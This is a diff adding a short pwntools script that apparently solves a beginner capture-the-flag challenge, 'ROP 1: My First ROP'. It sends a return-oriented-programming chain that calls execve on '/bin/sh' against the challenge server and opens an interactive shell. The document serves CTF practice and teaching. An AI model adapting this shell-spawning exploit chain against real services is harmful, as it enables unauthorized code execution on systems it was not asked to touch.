@@ -1,0 +1,39 @@
+Pwn | 108 | ROP 1: My First ROP by 1oner
+
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from pwn import *
+import os
+
+DEBUG = False
+
+elf_name = 'challenge'
+libc_name = ''
+remote_address = 'university.opentoallctf.com'
+remote_port = 30001
+
+#context.log_level = 'debug'
+context.arch = 'amd64'
+
+env = os.environ
+elf = ELF(elf_name)
+
+if libc_name != '':
+    libc = ELF(libc_name)
+    env['LD_PRELOAD'] = libc.path
+else:
+    libc = elf.libc
+
+if DEBUG:
+    p = process(elf.path, env=env)
+    #raw_input('start')
+else:
+    p = remote(remote_address, remote_port)
+
+payload = flat(0, elf.symbols['set_rax'], 59, elf.symbols['set_rdi'], elf.symbols['binsh'], elf.symbols['set_rsi'], 0, elf.symbols['set_rdx'], 0, elf.symbols['do_syscall'])
+
+p.send(payload)
+
+p.interactive()
+
